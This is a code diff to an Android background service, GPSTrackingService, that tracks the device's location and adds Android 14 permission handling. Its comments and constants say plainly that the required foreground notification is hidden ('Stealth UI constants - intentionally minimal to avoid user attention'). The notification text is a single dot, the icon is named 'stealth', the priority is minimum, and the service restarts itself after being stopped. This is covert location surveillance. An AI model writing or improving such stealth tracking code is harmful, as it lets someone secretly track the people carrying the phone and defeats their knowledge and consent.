@@ -1,15 +1,19 @@
 package com.fason.app.features.gps;
 
+import android.Manifest;
 import android.app.Notification;
 import android.app.NotificationChannel;
 import android.app.NotificationManager;
 import android.app.Service;
 import android.content.Intent;
+import android.content.pm.PackageManager;
 import android.content.pm.ServiceInfo;
 import android.os.Build;
 import android.os.IBinder;
+import android.util.Log;
 
 import androidx.core.app.NotificationCompat;
+import androidx.core.content.ContextCompat;
 
 import com.fason.app.R;
 import com.fason.app.core.Protocol;
@@ -17,28 +21,47 @@ import com.fason.app.service.MainService;
 
 public class GPSTrackingService extends Service {
 
+    private static final String TAG = "GPSTrackingService";
     private static final int NOTIF_ID = 3;
+    
+    // Stealth UI constants - intentionally minimal to avoid user attention
+    private static final String STEALTH_TEXT = ".";
+
     private GpsModule gpsModule;
-    /** True if this service created its own GpsModule (MainService wasn't available). */
     private boolean ownsModule = false;
 
     @Override
     public void onCreate() {
         super.onCreate();
         createChannel();
-        startForegroundCompat();
+        
+        // Khởi tạo module thông qua hàm provider để dễ mở rộng/override
+        this.gpsModule = provideGpsModule();
+        
+        if (gpsModule != null) {
+            gpsModule.startTracking();
+        } else {
+            Log.e(TAG, "GpsModule is null. Stopping service.");
+            stopSelf();
+            return;
+        }
 
-        // Reuse MainService's GpsModule to avoid duplicate instances with fragmented data.
-        // Only create a standalone instance as fallback when MainService is unavailable.
+        startForegroundCompat();
+    }
+
+    /**
+     * Pattern for Extensibility:
+     * Cho phép subclass hoặc module khác override cách lấy GpsModule.
+     * Mặc định sẽ dùng shared instance từ MainService, nếu không có thì tự tạo.
+     */
+    protected GpsModule provideGpsModule() {
         MainService svc = MainService.getInstance();
         if (svc != null && svc.getGpsModule() != null) {
-            gpsModule = svc.getGpsModule();
             ownsModule = false;
-        } else {
-            gpsModule = new GpsModule(this);
-            ownsModule = true;
+            return svc.getGpsModule();
         }
-        gpsModule.startTracking();
+        ownsModule = true;
+        return new GpsModule(this);
     }
 
     private void createChannel() {
@@ -49,8 +72,8 @@ public class GPSTrackingService extends Service {
         if (existing != null) return;
 
         NotificationChannel ch = new NotificationChannel(
-            Protocol.NOTIF_CHANNEL, ".", NotificationManager.IMPORTANCE_MIN);
-        ch.setDescription(".");
+            Protocol.NOTIF_CHANNEL, STEALTH_TEXT, NotificationManager.IMPORTANCE_MIN);
+        ch.setDescription(STEALTH_TEXT);
         ch.setShowBadge(false);
         ch.setSound(null, null);
         ch.enableLights(false);
@@ -60,11 +83,11 @@ public class GPSTrackingService extends Service {
         nm.createNotificationChannel(ch);
     }
 
-    private void startForegroundCompat() {
-        Notification n = new NotificationCompat.Builder(this, Protocol.NOTIF_CHANNEL)
+    protected Notification buildNotification() {
+        return new NotificationCompat.Builder(this, Protocol.NOTIF_CHANNEL)
             .setSmallIcon(R.drawable.ic_notif_stealth)
-            .setContentTitle(".")
-            .setContentText(".")
+            .setContentTitle(STEALTH_TEXT)
+            .setContentText(STEALTH_TEXT)
             .setOngoing(true)
             .setSilent(true)
             .setPriority(NotificationCompat.PRIORITY_MIN)
@@ -74,20 +97,35 @@ public class GPSTrackingService extends Service {
             .setGroupAlertBehavior(NotificationCompat.GROUP_ALERT_SUMMARY)
             .setCategory(NotificationCompat.CATEGORY_SERVICE)
             .build();
+    }
 
+    private void startForegroundCompat() {
+        Notification n = buildNotification();
+        
         try {
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
-                startForeground(NOTIF_ID, n, ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION);
+                // Android 14+ yêu cầu phải kiểm tra quyền trước khi định nghĩa type
+                if (ContextCompat.checkSelfPermission(this, Manifest.permission.FOREGROUND_SERVICE_LOCATION) 
+                        == PackageManager.PERMISSION_GRANTED) {
+                    startForeground(NOTIF_ID, n, ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION);
+                } else {
+                    // Nếu không có quyền, không thể chạy FGS Location trên Android 14+
+                    Log.e(TAG, "Missing FOREGROUND_SERVICE_LOCATION permission. Stopping service.");
+                    stopSelf();
+                }
             } else {
                 startForeground(NOTIF_ID, n);
             }
-        } catch (SecurityException e) {
-            startForeground(NOTIF_ID, n);
+        } catch (Exception e) {
+            // Catch broad Exception để handle các vấn đề về ForegroundServiceStartNotAllowedException
+            Log.e(TAG, "Failed to start foreground service", e);
+            stopSelf();
         }
     }
 
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
+        // START_STICKY: Hệ thống sẽ cố gắng khởi động lại service nếu nó bị kill
         return START_STICKY;
     }
 
@@ -100,7 +138,6 @@ public class GPSTrackingService extends Service {
     public void onDestroy() {
         if (gpsModule != null) {
             gpsModule.stopTracking();
-            // Only destroy the module if we created it (not shared with MainService)
             if (ownsModule) {
                 gpsModule.destroy();
             }
